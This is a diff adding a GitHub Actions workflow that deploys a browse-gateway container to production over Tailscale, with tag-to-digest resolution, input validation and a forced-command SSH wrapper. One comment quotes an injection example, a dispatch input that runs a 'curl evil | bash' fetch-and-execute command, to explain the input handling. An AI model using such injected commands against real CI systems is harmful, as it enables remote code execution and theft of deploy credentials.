@@ -1,0 +1,75 @@
+name: deploy-http
+
+# Manual, human-chosen deploy of the browse-gateway HTTP container to prod over Tailscale.
+# Resolves the requested tag to an immutable digest, joins the tailnet, then hands the digest to
+# the on-host forced-command wrapper which gates (validate-http), swaps, verifies, and auto-rolls
+# back. Never auto-deploys on merge — the ~10-20s recreate blips live agent instances.
+on:
+  workflow_dispatch:
+    inputs:
+      image_tag:
+        description: "Image tag to deploy (resolved to an immutable digest before anything runs)."
+        required: false
+        default: latest
+
+concurrency:
+  group: deploy-http-prod
+  cancel-in-progress: false
+
+permissions:
+  contents: read
+  packages: read
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    # Optional: configure a GitHub Environment named 'prod' with required reviewers to gate deploys.
+    environment: prod
+    steps:
+      - name: Resolve tag to immutable digest
+        id: resolve
+        env:
+          # Pass the dispatch input through env, never interpolated into the run: body — an input
+          # like `"; curl evil | bash` would otherwise execute on the runner that holds the deploy
+          # key + tailnet session. Charset-validate before use.
+          IMAGE_TAG: ${{ github.event.inputs.image_tag }}
+        run: |
+          set -euo pipefail
+          REPO="ghcr.io/${GITHUB_REPOSITORY,,}"   # ghcr repo paths are lowercase
+          case "$IMAGE_TAG" in
+            ''|*[!A-Za-z0-9._-]*) echo "::error::invalid image_tag '$IMAGE_TAG'"; exit 1 ;;
+          esac
+          DIGEST="$(docker buildx imagetools inspect "${REPO}:${IMAGE_TAG}" --format '{{.Manifest.Digest}}')"
+          case "$DIGEST" in
+            sha256:*) ;;
+            *) echo "::error::could not resolve a digest for ${REPO}:${IMAGE_TAG} (got '${DIGEST}')"; exit 1 ;;
+          esac
+          echo "image=${REPO}@${DIGEST}" >> "$GITHUB_OUTPUT"
+          echo "Resolved ${REPO}:${IMAGE_TAG} -> ${REPO}@${DIGEST}"
+
+      - name: Connect to tailnet (ephemeral, tag:ci-deploy)
+        uses: tailscale/github-action@6cae46e2d796f265265cfcf628b72a32b4d7cade # v3
+        with:
+          oauth-client-id: ${{ secrets.TS_OAUTH_CLIENT_ID }}
+          oauth-secret: ${{ secrets.TS_OAUTH_SECRET }}
+          tags: tag:ci-deploy
+
+      - name: Deploy on host (gate -> swap -> verify -> rollback)
+        env:
+          PROD_HOST: ${{ secrets.PROD_HOST }}
+          PROD_SSH_USER: ${{ secrets.PROD_SSH_USER }}
+          DEPLOY_SSH_KEY: ${{ secrets.DEPLOY_SSH_KEY }}
+          KNOWN_HOSTS: ${{ secrets.PROD_SSH_KNOWN_HOSTS }}
+          IMAGE: ${{ steps.resolve.outputs.image }}
+        run: |
+          set -euo pipefail
+          install -m 700 -d ~/.ssh
+          printf '%s\n' "$DEPLOY_SSH_KEY"  > ~/.ssh/deploy_key  && chmod 600 ~/.ssh/deploy_key
+          printf '%s\n' "$KNOWN_HOSTS"     > ~/.ssh/known_hosts && chmod 644 ~/.ssh/known_hosts
+          # The deploy key is locked on-host to command="…/deploy-on-host.sh"; our command string
+          # is delivered only as SSH_ORIGINAL_COMMAND, where the wrapper strictly validates it as a
+          # pinned digest. The key grants no shell, no forwarding, and works only from the tailnet.
+          ssh -i ~/.ssh/deploy_key -o IdentitiesOnly=yes \
+              -o StrictHostKeyChecking=yes -o UserKnownHostsFile=~/.ssh/known_hosts \
+              -o BatchMode=yes -o ConnectTimeout=15 \
+              "${PROD_SSH_USER}@${PROD_HOST}" "$IMAGE"
